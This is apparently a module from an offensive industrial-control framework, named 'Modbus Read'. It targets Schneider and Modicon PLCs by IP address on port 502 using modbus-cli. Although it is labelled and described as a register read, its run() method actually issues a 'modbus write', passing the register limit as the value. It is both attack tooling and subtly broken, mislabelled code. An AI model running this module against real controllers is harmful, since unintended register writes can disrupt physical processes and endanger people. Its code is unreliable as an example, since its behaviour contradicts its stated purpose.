import subprocess
from Base import Validators
from Base.Exploits import Exploit, Option


class Exploit(Exploit):
    """ Exploit template. """
    __info__ = {
        'name': 'exploits/modbus/read',
        'display_name': 'Modbus Read',
        'authors': [
            'D0ubl3G <d0ubl3g[at]protonmail.com>',
        ],
        'description': 'Modbus register read using modbus-cli.',
        'references': [
            'https://github.com/tallakt/modbus-cli',
        ],
        'devices': [
            'Schneider',
            'Modicon',
        ],
    }

    target = Option('', 'Target address e.g. 192.168.1.1', validators=Validators.ipv4)
    port = Option(502, 'Target Port')
    address = Option('%MW100', 'Target Register Address (Schneider-like and Modicon-like addresses)')
    limit = Option('100', 'Register Limit')

    def run(self):
        subprocess.call(['modbus', 'write', self.target, self.address, self.limit])
